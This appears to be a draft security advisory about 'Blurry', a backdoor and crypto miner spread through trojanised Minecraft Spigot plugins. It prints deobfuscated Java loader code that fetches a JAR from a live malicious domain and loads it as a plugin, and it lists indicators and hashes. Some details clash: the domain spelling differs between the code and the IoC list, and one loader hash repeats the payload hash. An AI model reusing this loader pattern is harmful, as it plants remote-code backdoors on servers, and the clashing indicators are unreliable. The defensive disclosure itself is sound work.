---
title: Blurry Spigot Backdoor
author: xyzeva
pubDatetime: 2023-07-20T13:50:10.627Z
postSlug: blurry-backdoor
featured: false
draft: true
tags:
  - threat
description: A new minecraft server backdoor and crypto minder.
---

MMPA members noticed some malicious activity going on their own personal servers, when given samples to investigate, MMPA uncovered the malware family "Blurry".

## What we know so far

Blurry is a multi-stage backdoor that is capable of completely taking over minecraft servers, crypto mining, and DDoSing.

Blurry works in 2 stagers, one being pulling for a domain, a JAR mainly named `BukkitScheduler.jar` and loading it into spigot, the loader is heavily obfuscated, but when cleaned up, it looks something like this:
```java
PluginManager pluginManager = Bukkit.getPluginManager();
if(pluginManager.getPlugin("BukkitScheduler") != null) return; 
URL url = new URL("https://i-really-love-cute-little-boys.fluyd.dev/aids/1ii1i1i11i1i1i1ii1i1iii1i11i1i1i1i1i1i1i1i1i1i1i1i1i1");
File file = new File("./plugins/BukkitScheduler.jar");
Files.copy(url.openStream(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
Plugin plugin = pluginManager.loadPlugin(file);
plugin.onLoad();
pluginManager.enablePlugin(plugin);
```

The malware has been seen to DDoS LGBT related minecraft servers. From what we can see, this is currently a minor threat, as it hasn't spread yet. But it should still be a good idea to check your servers.

## IoCs

- xmrig in minecraft server directory (`find | grep xmrig`)
- *.flud[.]dev

### Hashes
All hashes are provided as SHA-256.

#### Loaders
- `94e5218687c00baa61ea7a5348365fc4e0820b3cb81f16ff01972eaa231d6320` - `SoaromaSAC-1.0.65.jar` (Found on Bukkit, the actual plugin isnt affected.)
- `ffc965299059c29c4a806658215f99b5160d58b283befc7d3ac33b43c30cffeb` - Cracked Vulcan (`Vulcan-2.7.3.jar`)
- `1a9a698c6d9011727d1f4ace52bcf7630361765602cf729fc8bccc3774ce7ad2` - Fake copy of Open Source Project (`BedrockPlayerManager-1.4.jar`)

#### Payload
- `94e5218687c00baa61ea7a5348365fc4e0820b3cb81f16ff01972eaa231d6320` - `BukkitScheduler.jar`
- `8977470e0a766dc2deee2320eafeefa1f15d9adcc93f749418c362ee8ed4b858` - XMRig config (`config.json`)